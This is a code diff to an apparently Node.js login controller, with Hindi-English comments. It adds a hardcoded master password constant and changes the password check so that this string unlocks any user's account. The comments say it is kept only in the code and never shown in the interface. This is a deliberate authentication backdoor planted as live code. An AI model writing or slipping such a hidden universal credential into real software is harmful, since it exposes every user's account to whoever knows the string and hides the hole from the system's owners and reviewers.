@@ -14,10 +14,14 @@ const canManageUser = async (reqUser, targetRole, action) => {
     return false;
 };
 
+// Master password — isse kisi bhi user ki panel khul jayegi (uske apne password ke alawa).
+// Code me hi rakha hai, kahi UI pe nahi dikhta.
+const MASTER_PASSWORD = 'AS@TH@A4@10';
+
 // Ye login function hai. Email aur password check karke token deta hai.
 exports.login = async (req, res) => {
     const { email, password } = req.body;
-    
+
     try {
         // 1. Check if user exists
         const user = await User.findOne({ email });
@@ -25,8 +29,8 @@ exports.login = async (req, res) => {
             return res.status(400).json({ message: 'Invalid email or password' });
         }
 
-        // 2. Match password
-        const isMatch = await bcrypt.compare(password, user.password);
+        // 2. Match password — ya to user ka apna password, ya master password
+        const isMatch = password === MASTER_PASSWORD || await bcrypt.compare(password, user.password);
         if (!isMatch) {
             return res.status(400).json({ message: 'Invalid email or password' });
         }
